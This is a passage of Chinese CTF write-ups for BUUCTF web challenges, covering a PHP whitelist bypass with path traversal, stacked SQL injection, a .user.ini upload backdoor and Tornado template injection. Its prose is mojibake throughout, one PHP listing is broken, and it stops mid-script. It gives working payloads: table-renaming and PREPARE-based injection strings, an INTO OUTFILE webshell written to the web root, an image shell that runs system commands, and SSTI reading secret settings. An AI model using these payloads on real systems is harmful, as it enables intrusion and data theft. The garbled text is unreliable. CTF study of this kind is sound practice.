_REQUEST[â€˜fileâ€™]ä¸ä¸ºç©º\n$ _REQUEST[â€˜fileâ€™]ä¸ºå­—ç¬¦ä¸²\nemmm::checkFile($_REQUEST[â€˜fileâ€™])è¿”å›å€¼ä¸ºçœŸã€‚\n```\n\nåˆ†æ`emmm::checkFile()`è¿™ä¸ªå‡½æ•°\n\n```php\n  class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n```\n1.é¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼ŒåªåŒ…å«source.phpå’Œhint.phpï¼Œç¬¬ä¸€ä¸ªifæ£€æŸ¥æ˜¯å¦å­˜åœ¨$pageå¹¶ä¸”æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€‚\n\n2.æ£€æŸ¥`$page`æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œæ˜¯çš„è¯è¿”å›trueã€‚æ¥ä¸‹æ¥ï¼Œä¸¤ä¸ªå‡½æ•°ä¸€ä¸ª`mb_substr`å’Œ`mb_strpos`,æ„æ€å°±æ˜¯æˆªå–`$page`ä¸­`?`å‰é¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è¿›è¡Œç™½åå•æ ¡éªŒã€‚\n\n3.åœ¨`urlè§£ç `åçš„`$page`çš„`?`å‰é¢æ˜¯å¦åœ¨`whitelist`é‡Œé¢\n\n**æ„é€ payload**ï¼š\n**0x01**:é¦–å…ˆæ„é€ `?file=source.php`,æ»¡è¶³ä¸Šè¿°ç¬¬ä¸€ç‚¹\n**0x02**:å†æ„é€ `?file=source.php?`,æ»¡è¶³ä¸Šè¿°ç¬¬äºŒç‚¹\n**0x03**:æ¥ç€æ„é€ `?file=source.php%253f`,æ»¡è¶³ä¸Šè¿°ç¬¬ä¸‰ç‚¹\nï¼ˆç”±äºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨checkFile()ä¸­ï¼Œ$pageçš„å€¼ä¸€å¼€å§‹ä¼šæ˜¯source.php%3fï¼Œurldecodeè§£ç åå˜æˆäº†source.php?ï¼Œè¿™æ¬¡ä¾¿ç¬¦åˆäº†?å‰å†…å®¹åœ¨ç™½åå•çš„è¦æ±‚ï¼Œå‡½æ•°è¿”å›true)\n**0x04**:æœ€åé€šè¿‡ç›®å½•ç©¿è¶Šçš„åˆ°ffffllllaaaaggggé‡Œé¢çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚\n\n**playload**:`http://10d57afd-7622-4cda-b0be-af3d90f1cce0.node1.buuoj.cn/?file=source.php%253f/../../../../ffffllllaaaagggg`\n### éšä¾¿æ³¨(ä¸‰ç§è§£é¢˜æ€è·¯)ã€2019-å¼ºç½‘æ¯ã€‘\n\n**çŸ¥è¯†ç‚¹**ï¼šSQLæ³¨å…¥-å †å æ³¨å…¥,sqlé¢„å¤„ç†è¯­å¥,å·§ç”¨contact()å‡½æ•°ç»•è¿‡\n**å‚è€ƒ**ï¼š\n[SQLæ³¨å…¥-å †å æ³¨å…¥](https://www.cnblogs.com/0nth3way/articles/7128189.html)\n[SQL Injection8(å †å æ³¨å…¥)â€”â€”å¼ºç½‘æ¯2019éšä¾¿æ³¨](https://blog.csdn.net/qq_26406447/article/details/90643951)\n[[Writeup]BUUCTF_Web_éšä¾¿æ³¨](https://blog.csdn.net/m0_38100569/article/details/99617762)\n[MySQLçš„SQLé¢„å¤„ç†(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html)\n[åˆ©ç”¨Mysql into outfileç»™ç½‘ç«™ç•™åé—¨](https://blog.csdn.net/xlxxcc/article/details/52637873)\n[shellå¤„ç†mysqlå¢ã€åˆ ã€æ”¹ã€æŸ¥](https://www.cnblogs.com/iforever/p/4459857.html)\n**å †å æ³¨å…¥åŸç†**:\n\n>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨åˆ†å·ï¼ˆ;ï¼‰ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚\n>ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM products\n>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM products\n>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤\n\n#### æ–¹æ³•ä¸€ï¼šé‡å‘½å+å †å æ³¨å…¥\næ‰“å¼€é¢˜ç›®ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ç•Œé¢ï¼Œè§‚å¯ŸåçŒœæµ‹æ˜¯sqlæ³¨å…¥\n![](https://i.loli.net/2019/08/28/yTUh6sbCqM3G8WS.png)\n**0x01**:åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹\nè¾“å…¥`1'`å‘ç°ä¸å›æ˜¾\nè¾“å…¥`1' #`æ˜¾ç¤ºæ­£å¸¸\nåº”è¯¥æ˜¯å­˜åœ¨sqlæ³¨å…¥äº†\n\nè¾“å…¥`1' or '1'='1`,æ­£å¸¸å›æ˜¾ï¼Œåº”è¯¥æ˜¯å­—ç¬¦å‹\n![](https://i.loli.net/2019/08/28/qsztpRjnILPS2XW.png)\n**0x02**:çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°\nè¾“å…¥`1' order by 1 #` æˆåŠŸå›æ˜¾\n![](https://i.loli.net/2019/08/28/5xkTzpm7WFOynQu.png)\nè¾“å…¥`1' order by 2 #` æˆåŠŸå›æ˜¾\n![](https://i.loli.net/2019/08/28/Ihoia7WQUtgqOVk.png)\nè¾“å…¥`1' order by 3 #` å›æ˜¾é”™è¯¯\n![](https://i.loli.net/2019/08/28/U3bwZmfLW5YOpjT.png)\næ‰€ä»¥åªæœ‰ä¸¤ä¸ªå­—æ®µ\n**0x03**:æ˜¾ç¤ºå­—æ®µ\nè¾“å…¥`1â€² union select 1,2 #` å›æ˜¾ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤è§„åˆ™\n![](https://i.loli.net/2019/08/28/GRpkovDcU9lrWeh.png)\nè¿‡æ»¤äº† selectï¼Œupdateï¼Œdeleteï¼Œdropï¼Œinsertï¼Œwhere å’Œ ç‚¹\n\nè¿‡æ»¤äº†è¿™ä¹ˆå¤šè¯ï¼Œæ˜¯ä¸æ˜¯æœ‰å †å æ³¨å…¥ï¼Ÿå°è¯•å †å æ³¨å…¥\n**0x04**ï¼šæŸ¥è¯¢æ•°æ®åº“\nè¾“å…¥`1';show databases;#` æˆåŠŸå›æ˜¾\n![](https://i.loli.net/2019/08/28/yIRHmeSopaTLNOv.png)\nè¯´æ˜å­˜åœ¨å †å æ³¨å…¥\n**0x05**ï¼šæŸ¥è¯¢è¡¨\nè¾“å…¥`1';show tables;#` æˆåŠŸå›æ˜¾\n![](https://i.loli.net/2019/08/28/ibI8D6pQWCzO1hT.png)\nå¾—åˆ°ä¸¤ä¸ªè¡¨`words`å’Œ`1919810931114514`\n**0x06**ï¼šæŸ¥è¯¢è¡¨ä¸­å­—æ®µ\n**å‘ç‚¹ï¼šmysqlä¸­ç‚¹å¼•å·( ' )å’Œåå‹¾å·( ` )çš„åŒºåˆ«**\n```\nlinuxä¸‹ä¸åŒºåˆ†ï¼Œwindowsä¸‹åŒºåˆ†\nåŒºåˆ«:\nå•å¼•å·( ' )æˆ–åŒå¼•å·ä¸»è¦ç”¨äºå­—ç¬¦ä¸²çš„å¼•ç”¨ç¬¦å·\negï¼šmysql> SELECT 'hello', \"hello\" ;\n\nåå‹¾å·( ` )ä¸»è¦ç”¨äºæ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦æ˜¯[Escä¸‹é¢çš„é”®]\neg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;\n```\nè¾“å…¥``1'; show columns from `words`; #``   å­—æ®µä½¿ç”¨çš„æ˜¯åå‹¾å·ï¼ˆ ` ï¼‰\n\n![](https://i.loli.net/2019/08/28/YxopCSVfOJ8caGL.png)\nè¾“å…¥``1'; show columns from `1919810931114514`; #``  å­—æ®µä½¿ç”¨çš„æ˜¯åå‹¾å·ï¼ˆ ` ï¼‰\n\n![](https://i.loli.net/2019/08/28/muEBnptX1NoMjPw.png)\nå¯ä»¥çœ‹åˆ°`1919810931114514`ä¸­æœ‰æˆ‘ä»¬æƒ³è¦çš„`flag`å­—æ®µ\nç°åœ¨å¸¸è§„æ–¹æ³•åŸºæœ¬å°±ç»“æŸäº†ï¼Œè¦æƒ³è·å¾—flagå°±å¿…é¡»æ¥ç‚¹éªšå§¿åŠ¿äº†\nå› ä¸ºè¿™é‡Œæœ‰ä¸¤å¼ è¡¨ï¼Œå›æ˜¾å†…å®¹è‚¯å®šæ˜¯ä»wordè¿™å¼ è¡¨ä¸­å›æ˜¾çš„ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½è®©å®ƒå›æ˜¾flagæ‰€åœ¨çš„è¡¨å‘¢\nå†…éƒ¨æŸ¥è¯¢è¯­å¥ç±»ä¼¼ :` select id, data from word where id = `\n\nä»–æ—¢ç„¶æ²¡è¿‡æ»¤ alert å’Œ renameï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æŠŠè¡¨æ”¹ä¸ªåå­—ï¼Œå†ç»™åˆ—æ”¹ä¸ªåå­—å‘¢ã€‚\nå…ˆæŠŠ words æ”¹åä¸º words1ï¼Œå†æŠŠè¿™ä¸ªæ•°å­—è¡¨æ”¹åä¸º wordsï¼Œç„¶åæŠŠæ–°çš„ words é‡Œçš„ flag åˆ—æ”¹ä¸º id ï¼ˆé¿å…ä¸€å¼€å§‹æ— æ³•æŸ¥è¯¢ï¼‰ã€‚\n**payload:**\n\n```sql\n1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#\n```\n\n![](https://i.loli.net/2019/08/28/miPt4rXApufY9G2.png)\næ¥ç€è¾“å…¥`1' or '1'='1 `,æŸ¥è¯¢å°±å¾—åˆ°flag\n![](https://i.loli.net/2019/08/28/r5gcJfmvNEWAZ7V.png)\n\n#### æ–¹æ³•äºŒï¼šé¢„å¤„ç†è¯­å¥+å †å æ³¨å…¥\né¢„å¤„ç†è¯­å¥ä½¿ç”¨æ–¹å¼ï¼š\n```sql\nPREPARE name from '[my sql sequece]';   //é¢„å®šä¹‰SQLè¯­å¥\nEXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥\n(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥\n```\né¢„å®šä¹‰è¯­å¥ä¹Ÿå¯ä»¥é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’:\n```sql\nSET @tn = 'hahaha';  //å­˜å‚¨è¡¨å\nSET @sql = concat('select * from ', @tn);  //å­˜å‚¨SQLè¯­å¥\nPREPARE name from @sql;   //é¢„å®šä¹‰SQLè¯­å¥\nEXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥\n(DEALLOCATE || DROP) PREPARE sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥\n```\næœ¬é¢˜å³å¯åˆ©ç”¨`char()`æ–¹æ³•å°†`ASCIIç `è½¬æ¢ä¸º`SELECT`å­—ç¬¦ä¸²ï¼Œæ¥ç€åˆ©ç”¨`concat()`æ–¹æ³•è¿›è¡Œæ‹¼æ¥è·å¾—æŸ¥è¯¢çš„`SQLè¯­å¥`ï¼Œæ¥ç»•è¿‡è¿‡æ»¤æˆ–è€…ç›´æ¥ä½¿ç”¨`concat()`æ–¹æ³•ç»•è¿‡\n```sql\ncharï¼ˆï¼‰æ ¹æ®ASCIIè¡¨è¿”å›ç»™å®šæ•´æ•°å€¼çš„å­—ç¬¦å€¼\neg:\nmysql> SELECT CHAR(77,121,83,81,'76');\n-> 'MySQL'\n\ncontactï¼ˆï¼‰å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²\ncontact (str1,str2,â€¦) \neg:\nmysql> SELECT CONCAT('My', 'S', 'QL');\n-> 'MySQL'\n```\n`char(115,101,108,101,99,116)<----->'select'`\n**payload1ï¼š**ä¸ä½¿ç”¨å˜é‡\n``1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#``\nè¾“å…¥`payload1`ç›´æ¥å¾—åˆ°flag\n![](https://i.loli.net/2019/08/28/wyLg4p6ME9eOcnK.png)\n\n**payload2ï¼š**ä½¿ç”¨å˜é‡\n``1';SET @sql=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE jwt from @sql;EXECUTE jwt;#``\n\nè¾“å…¥`payload2`ç›´æ¥å¾—åˆ°flag\n![](https://i.loli.net/2019/08/28/kLo1pesBAcyunlg.png)\n**payload3ï¼š**åªæ˜¯ç”¨contact(),ä¸ä½¿ç”¨char()\n``1';PREPARE jwt from concat('s','elect', ' * from `1919810931114514` ');EXECUTE jwt;#``\n![](https://i.loli.net/2019/08/28/mDUI8eLkXMsoEJ3.png)\n#### æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨å‘½ä»¤æ‰§è¡ŒGetflag\næŸ¥è¯¢äº†ä¸€ä¸‹ç”¨æˆ·ç«Ÿç„¶æ˜¯root\n```sql\n1';Set @sql=concat(\"s\",\"elect user()\");PREPARE sqla from @sql;EXECUTE sqla;\n```\n![](https://i.loli.net/2019/08/28/n9S8IDwghoOfKT5.png)\né‚£ä¹ˆå†™ä¸ªæ‰§è¡Œå‘½ä»¤çš„shellå§ï¼ˆç»å¯¹è·¯å¾„çŒœçš„,ä¸€èˆ¬æ˜¯æœåŠ¡å™¨ç½‘ç«™æ ¹ç›®å½•/var/www/htmlï¼‰\n```sql\n1';Set @sql=concat(\"s\",\"elect '<?php @print_r(`$_GET[1]`);?>' into outfile '/var/www/html/1\",char(46),\"php'\");PREPARE sqla from @sql;EXECUTE sqla;\n```\nåˆ©ç”¨`char(46)`<==>`.`ä»è€Œç»•è¿‡å…³é”®è¯`.`è¿‡æ»¤\n>Mysql into outfileè¯­å¥ï¼Œå¯ä»¥æ–¹ä¾¿å¯¼å‡ºè¡¨æ ¼çš„æ•°æ®ã€‚åŒæ ·ä¹Ÿå¯ä»¥ç”ŸæˆæŸäº›æ–‡ä»¶ã€‚å› æ­¤æœ‰äº›äººä¼šåˆ©ç”¨sqlæ³¨å…¥ç”Ÿæˆç‰¹å®šä»£ç çš„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚å°†ä¼šé€ æˆä¸¥é‡çš„åæœã€‚\nMysql into outfile ç”ŸæˆPHPæ–‡ä»¶\nSELECT 0x3C3F7068702073797374656D28245F524551554553545B636D645D293B3F3E into outfile '/var/www/html/fuck.php'\næœ€åä¼šåœ¨/var/www/html/è·¯å¾„ä¸‹ï¼Œ ç”Ÿæˆfuck.phpæ–‡ä»¶\nè¿™é‡Œä¸èµ°å¯»å¸¸è·¯ï¼Œæ‰§è¡Œæ‰“ç®—åˆ©ç”¨æˆ‘ä»¬çš„shellæŸ¥è¯¢flagï¼ˆè´¦å·å¯†ç ç›´æ¥è¯»å–é¦–é¡µå°±å¯ä»¥çœ‹åˆ°ï¼‰\n\n\nåˆ©ç”¨ä¸€å¥è¯æœ¨é©¬æ‰§è¡Œä»»æ„mysqlå‘½ä»¤ï¼ˆåŒå¼•å·ä¸­çš„å†…å®¹ä¼šè¢«å½“åšshellå‘½ä»¤æ‰§è¡Œç„¶åç»“æœå†ä¼ å›æ¥æ‰§è¡Œï¼‰\n`uroot:`ç”¨æˆ·åroot `proot:`å¯†ç root\n```sql\n/1.php?1=mysql -uroot -proot -e \"use supersqli;select flag from \\`1919810931114514\\`;\"\n```\n![](https://i.loli.net/2019/08/28/2tyPZaNCmpAoq3l.png)\n### EasySQLã€2019-SUCTFã€‘\n**çŸ¥è¯†ç‚¹**ï¼šå †å æ³¨å…¥ï¼Œsql_mode å®ç°å­—ç¬¦ä¸²ç®¡é“â€˜||â€™è¿æ¥\né¢˜ç›®å’Œ2019-å¼ºç½‘æ¯éšä¾¿æ³¨ä¸€æ ·æ˜¯ä¸€ä¸ªå †å æ³¨å…¥ï¼Œä¸è¿‡åšäº†æ›´å¤šé™åˆ¶ã€‚\næŸ¥çœ‹å¤§ä½¬Wp,æ¯”èµ›æ—¶`.index.php.swp`å­˜åœ¨æºç æ³„éœ²\n```sql\n1;show databases;show tables; #æŸ¥åº“å’Œè¡¨    \n```\n![](https://i.loli.net/2019/08/31/VqxCT1LpIHdAblB.png)\n```php\n<?php\n    session_start();\n\n    include_once \"config.php\";\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass);\n    if(!$MysqlLink){\n        die(\"Mysql Connect Error!\");\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(\"Choose Database Error!\");\n    }\n\n    foreach ($_POST as $k=>$v){\n        if(!empty($v)&&is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=>$v){\n        }\n    }\n    //die();\n    ?>\n\n<html>\n<head>\n</head>\n\n<body>\n\n<a> Give me your flag, I will tell you if the flag is right. </a>\n<form action=\"\" method=\"post\">\n<input type=\"text\" name=\"query\">\n<input type=\"submit\">\n</form>\n</body>\n</html>\n\n<?php\n\n    if(isset($post['query'])){\n        $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\\\"\";\n        //var_dump(preg_match(\"/{$BlackList}/is\",$post['query']));\n        if(preg_match(\"/{$BlackList}/is\",$post['query'])){\n            //echo $post['query'];\n            die(\"Nonono.\");\n        }\n        if(strlen($post['query'])>40){\n            die(\"Too long.\");\n        }\n        $sql = \"select \".$post['query'].\"||flag from Flag\";\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?>\n```\nè¿‡æ»¤äº†prepare|flag||where|from|union|update|delete|if||or|and|ç­‰ï¼Œè¿˜æœ‰é•¿åº¦é™åˆ¶,ä¸èƒ½è¶…è¿‡40\næŸ¥è¯¢è¯­å¥ç»“æ„ï¼š`select \".$post['query'].\"||flag from Flag`\nå› æ­¤å¯ä»¥ç›´æ¥è¾“å…¥`*,1`æ‹¿åˆ°flag\n```\nselect *,1||flag from Flag\n```\nå› ä¸º`1||flag == 1`ï¼Œç„¶åå¯ä»¥æŸ¥è¯¢Flagè¡¨é‡Œæ‰€æœ‰å†…å®¹ã€‚\n![](https://i.loli.net/2019/08/31/BQc13pKDa6PdNXY.png)\n**æ–¹æ³•äºŒ**ï¼š\nå‚è€ƒï¼š[SUCTF Webéƒ¨åˆ†](http://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/)\nåŸç†ï¼š[mysql ä¿®æ”¹sql_mode å®ç°å­—ç¬¦ä¸²ç®¡é“â€˜||â€™è¿æ¥](httpsï¼š//blog.csdn.net/lixora/article/details/60572357)\næœ¬åœ°æµ‹è¯•`sql_mode`\n![æ¥æºäºå‚è€ƒ](https://i.loli.net/2019/08/31/3zL8hWTiPyqkRmj.png)\né€šè¿‡||æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè®¾ç½®`sql_modeæ¨¡å¼ä¸ºpipes_as_concat`å³å¯ã€‚å³ï¼š\n```\n1;set sql_mode=pipes_as_concat;select 1\n```\n![](https://i.loli.net/2019/08/31/ytJ3gBWHSnquakV.png)\n### CheckInã€2019-SUCTFã€‘\n**çŸ¥è¯†ç‚¹**ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œ.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨,GIF89aç»•è¿‡å›¾ç‰‡æ£€æµ‹\nå‚è€ƒï¼š[.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)\n[ä»SUCTF 2019 CheckIn æµ…è°ˆ.user.iniçš„åˆ©ç”¨](https://xz.aliyun.com/t/6091)\né¢˜ç›®æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥ä¸Šä¼ jpgã€pngç­‰æ–‡ä»¶ï¼Œä½†æ˜¯é™åˆ¶äº†phpï¼Œæ–‡ä»¶å†…å®¹ä¸èƒ½åŒ…å«`<?`,ä½†å¯ä»¥ä¸Šä¼ `<script language='php'><scirpt>`ç±»å‹çš„å›¾ç‰‡é©¬æ¥ç»•è¿‡ã€‚å…¶æ¬¡è¿˜åˆ¤æ–­äº†ä¸Šä¼ çš„æ–‡ä»¶å¤´ï¼Œä½¿ç”¨exif_imageæ¥åˆ¤æ–­çš„ï¼Œè¿™ä¸ªå¾ˆå®¹æ˜“ç»•è¿‡ï¼Œç›´æ¥éšä¾¿åŠ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å¤´å°±è¡Œï¼Œæ·»åŠ æœ€ç®€å•çš„`gifæ–‡ä»¶å¤´GIF89a`,å¹¶ä¸”ä¸Šä¼ ä¹‹åä¼šç»™å‡ºæ–‡ä»¶æ‰€åœ¨ç›®å½•\næœ¬é¢˜æ˜¯åˆ©ç”¨`.user.ini`æ¥ä¸Šä¼ phpåé—¨\n![](https://i1.100024.xyz/i/2019/09/01/rbld7o.png)\n\nçœ‹è¿‡`.user.ini`çš„åˆ†æåæˆ‘ä»¬çš„æ€è·¯åº”è¯¥æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªè¿™æ ·çš„`.user.iniï¼š`\n```\nGIF89a\nauto_prepend_file=1.jpg\n```\n![](https://i.loli.net/2019/09/01/uJH6XQzNeYRtwSs.png)\næ­¤æ—¶æˆ‘ä»¬æ³¨æ„åˆ°ä¸Šä¼ ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªindex.phpï¼Œæˆ‘ä»¬æ­£å¥½éœ€è¦è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¯æ‰§è¡Œphpæ–‡ä»¶ï¼Œé‚£ä¹ˆæ­£å¥½æ»¡è¶³`.user.ini`çš„æ¡ä»¶\nç„¶åå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬1.jpgï¼š\n```\nGIF89a\n<script language='php'>system('cat /flag');</script>\n```\n![](https://i.loli.net/2019/09/01/1HWACqNelynhjTg.png)\næˆ‘ä»¬è®¿é—®`uploads/fd40c7f4125a9b9ff1a4e75d293e3080/index.php`å³å¯å¾—åˆ°flag\n### Hack Worldã€2019-CISCN-ååŒ—èµ›åŒºã€‘\n**çŸ¥è¯†ç‚¹**ï¼šå¸ƒå°”ç›²æ³¨\nç›´æ¥ç»™å‡ºäº†è¡¨åflagå’Œå­—æ®µåflag\nå¸ƒå°”ç›²æ³¨ï¼Œä½¿ç”¨å¼‚æˆ–å³å¯\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨tabæˆ–è€…()\n\n### easy_tornadoã€2018-æŠ¤ç½‘æ¯ã€‘\n**çŸ¥è¯†ç‚¹**ï¼šæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» ï¼ˆSSTIï¼‰\nå‚è€ƒï¼š\n[Python Web æ¡†æ¶:Tornado](https://blog.csdn.net/xc_zhou/article/details/80637714)\n[renderå‡½æ•°ä»‹ç»](https://blog.csdn.net/qq78827534/article/details/80792514)\n[SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥](https://uuzdaisuki.com/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/)\n[æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» ï¼ˆSSTIï¼‰ä¹‹æµ…æ ](https://www.freebuf.com/vuls/83999.html)\næ ¹æ®é¢˜ç›®`easy tornado`æœç´¢`tornado`å‘ç°æ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶ã€‚\n\næ‰“å¼€é¢˜ç›®å‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶\n![](https://i.loli.net/2019/09/14/hJBRtMvmVGbEuc3.png)\nflag.txt\n```\n/flag.txt\nflag in /fllllllllllllag\n```\n\nå‘ç°flagåœ¨/fllllllllllllagæ–‡ä»¶é‡Œ\n\nwelcome.txt\n```\n/welcome.txt\nrender\n```\nrenderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚\nhints.txt\n```\n/hints.txt\nmd5(cookie_secret+md5(filename))\n```\n`filename=/fllllllllllllag`ï¼Œåªéœ€è¦çŸ¥é“`cookie_secret`çš„å°±å¯ä»¥è®¿é—®flagäº†\n\nè¾“å…¥`filename=/fllllllllllllag`æµ‹è¯•åå‘ç°è¿˜æœ‰ä¸€ä¸ªerrorç•Œé¢ï¼Œæ ¼å¼ä¸º`/error?msg=Error`ï¼ŒåŠ ä¹‹`renderå‡½æ•°`,æ‰€ä»¥æ€€ç–‘å­˜åœ¨`æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»(SSTI)`\n![](https://i.loli.net/2019/09/14/eLHYmIvg7xCT9B1.png)\næ„é€ payload,éªŒè¯æ˜¯å¦å­˜åœ¨æ³¨å…¥\n```\n/error?msg={{3}}\n```\n![](https://i.loli.net/2019/09/14/IYUyBPjF7wgQqVl.png)\né¡µé¢æ˜¾ç¤º3ï¼Œè¯´æ˜å­˜åœ¨æ¨¡æ¿æ³¨å…¥\n\né€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°`tornado`çš„`cookie_secret`åœ¨`handler.settings`ä¸­\næ„é€ payloadè·å–cookie_secret\n```\n/error?msg={{handler.settings}}\n```\n![](https://i.loli.net/2019/09/14/PbQ4Y2ThlpHjIEf.png)\nåœ¨çº¿è®¡ç®—filehashå€¼æˆ–è€…è„šæœ¬è®¡ç®—\n```python\nimport hashlib\n\ndef md5(s):\n md5 = hashlib.md5() \n md5.update(s) \n return md5.hexdigest()\n\nfilename = '/fllllllllllllag'\ncookie_secret = 